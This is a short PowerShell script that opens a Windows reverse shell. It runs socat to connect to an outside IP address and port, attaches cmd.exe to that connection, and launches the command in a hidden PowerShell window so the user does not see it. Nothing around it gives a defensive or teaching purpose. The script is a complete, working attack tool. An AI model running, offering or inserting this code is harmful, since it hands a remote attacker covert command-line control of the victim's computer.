$command = ".\socat.exe tcp-connect:18.198.77.177:11584 exec:""cmd.exe"",pipes"
Start-Process "powershell.exe" -ArgumentList "-NoProfile -Command `"& { $command }`"" -WindowStyle Hidden
